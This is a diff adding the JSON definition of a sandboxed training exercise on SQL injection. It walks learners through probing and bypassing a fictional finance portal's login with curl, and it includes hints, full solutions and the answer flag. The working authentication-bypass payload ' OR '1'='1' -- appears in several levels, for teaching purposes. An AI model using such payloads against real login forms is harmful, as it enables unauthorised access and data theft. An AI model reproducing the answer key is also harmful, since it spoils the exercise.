@@ -1,0 +1,193 @@
+{
+  "title": "SQL Injection — Login Form Bypass",
+  "description": "Discover and exploit a classic SQL injection vulnerability in a web login form to bypass authentication and retrieve a hidden flag.",
+  "prerequisites": [],
+  "outcomes": [
+    "Understand how unsafe string concatenation in SQL queries creates injection vulnerabilities.",
+    "Use a single quote to probe a login form and confirm SQL injection is possible.",
+    "Craft a basic authentication bypass payload and retrieve sensitive data from the database."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": false,
+  "estimated_duration": 35,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or Google the technique.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, Pinnacle Finance, has asked you to review their internal employee portal before it goes live. The development team assures you the login form is 'good enough'. Your job is to prove them wrong.\n\nThe portal is a PHP web application backed by a database. Your target: bypass the login form without knowing a valid password and retrieve the flag stored in the database."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "passkey": "start",
+      "cloud_content": "SSH to your attacker machine at **10.1.29.23**, then open a browser or use curl to reach the target:\n\n```\ncurl http://10.1.29.10/login.php\n```\n\nThe target server is at **10.1.29.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "The target web application is running locally:\n\n```\ncurl http://127.0.0.1/login.php\n```\n\nOr open http://127.0.0.1/login.php in a browser. Submit **start** to begin."
+    },
+    {
+      "title": "Probe for SQL Injection",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 8,
+      "answer": "'",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have found the Pinnacle Finance login form at `/login.php`. Before attempting a full attack, pentesters always probe a form to confirm it is actually vulnerable.\n\nThe classic first probe for SQL injection is to enter a **single quote** into an input field. If the application passes the input directly to a SQL query without sanitising it, the quote will break the SQL syntax and cause a visible database error.\n\nTry it:\n\n```\ncurl -X POST --data-urlencode \"username='\" --data-urlencode \"password=test\" http://10.1.29.10/login.php\n```\n\nLook at the response. A real SQL error message confirms the application is vulnerable — the database engine's complaint leaks into the page.\n\n**What single character did you enter to trigger the database error?**",
+      "solution": "```\n$ curl -X POST --data-urlencode \"username='\" --data-urlencode \"password=test\" \\\n    http://10.1.29.10/login.php\n\n...Database error: unable to prepare statement: unrecognized token: \"'\"...\n```\n\nThe single quote `'` breaks the SQL string literal and causes a syntax error. The answer is **'**",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "What is the classic SQL injection probe character?",
+          "content": "The single quote `'` is the character that delimits string literals in SQL. Inserting one breaks the query syntax and triggers an error if input is not sanitised.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "What should the response look like?",
+          "content": "You are looking for a response that contains the words 'Database error' or mentions SQLite. That confirms the application is passing your input directly to a SQL query.",
+          "hint_penalty": 2,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Bypass Authentication",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 12,
+      "answer": "admin",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have confirmed SQL injection. Now exploit it to bypass the login entirely.\n\nThe application builds its query like this:\n\n```sql\nSELECT username FROM users WHERE username='INPUT' AND password='INPUT'\n```\n\nIf you supply `' OR '1'='1' --` as the username, the query becomes:\n\n```sql\nSELECT username FROM users WHERE username='' OR '1'='1' --' AND password='...'\n```\n\nThe `--` starts a SQL comment, discarding everything after it. The condition `'1'='1'` is always true, so the query returns the first user in the database — no password needed.\n\nRun the bypass:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  http://10.1.29.10/login.php\n```\n\n**What username appears in the welcome message after the bypass succeeds?**",
+      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username=' OR '1'='1' --\" \\\n    --data-urlencode \"password=anything\" \\\n    http://10.1.29.10/login.php\n\n...Welcome, admin!...\n```\n\nThe first user in the database is **admin**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What does -- do in SQL?",
+          "content": "In SQL, `--` starts a single-line comment. Everything after it on the same line is ignored. This is used to 'cut off' the rest of the original query — including the password check.",
+          "hint_penalty": 3,
+          "order": 0
+        },
+        {
+          "title": "Why does OR '1'='1' work?",
+          "content": "`'1'='1'` is a condition that is always true. Using OR means the entire WHERE clause evaluates to true for every row, so the query returns the first user in the database.",
+          "hint_penalty": 5,
+          "order": 1
+        },
+        {
+          "title": "What exactly should I enter as the username?",
+          "content": "Enter exactly: `' OR '1'='1' --` (note the spaces). Use `--data-urlencode` in curl so the apostrophes are encoded correctly.",
+          "hint_penalty": 5,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 25,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Retrieve the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 5,
+      "answer": "WMG{sq1_1nj3ct10n_byp4ss3d_auth}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You are authenticated as `admin`. The welcome message shows more than just the username — look carefully at the full response.\n\nThe development team stored a sensitive value in a separate `secrets` table. Once authentication is bypassed, the application retrieves it and displays it alongside your username.\n\nRun the same bypass again and read the full welcome message:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  http://10.1.29.10/login.php\n```\n\nIn a real engagement this same technique can expose passwords, credit card numbers, session tokens, or any other data the application can reach in the database.\n\n**Submit the flag shown in the welcome message.**",
+      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username=' OR '1'='1' --\" \\\n    --data-urlencode \"password=anything\" \\\n    http://10.1.29.10/login.php\n\n...Welcome, admin! WMG{sq1_1nj3ct10n_byp4ss3d_auth}...\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where is the flag in the response?",
+          "content": "Run the exact same bypass as the previous level. The flag appears in the welcome message right after the username.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What format is the flag?",
+          "content": "The flag starts with `WMG{` and ends with `}`.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1005" }
+      ]
+    },
+    {
+      "title": "Feedback",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "assessment_type": "QUESTIONNAIRE",
+      "instructions": "Please answer these questions to help us improve the game.",
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How difficult did you find this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            { "text": "Too easy",      "correct": true, "order": 0 },
+            { "text": "About right",   "correct": true, "order": 1 },
+            { "text": "Too difficult", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Before this game, had you heard of SQL injection?",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            { "text": "Yes, I knew how to exploit it", "correct": true, "order": 0 },
+            { "text": "I had heard of it but not tried it", "correct": true, "order": 1 },
+            { "text": "No, this was completely new", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "How clear were the level instructions?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            { "text": "Very clear",         "correct": true, "order": 0 },
+            { "text": "Mostly clear",        "correct": true, "order": 1 },
+            { "text": "Confusing at times",  "correct": true, "order": 2 },
+            { "text": "Hard to follow",      "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What would you change or add to improve this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": false,
+          "choices": []
+        }
+      ]
+    }
+  ]
+}
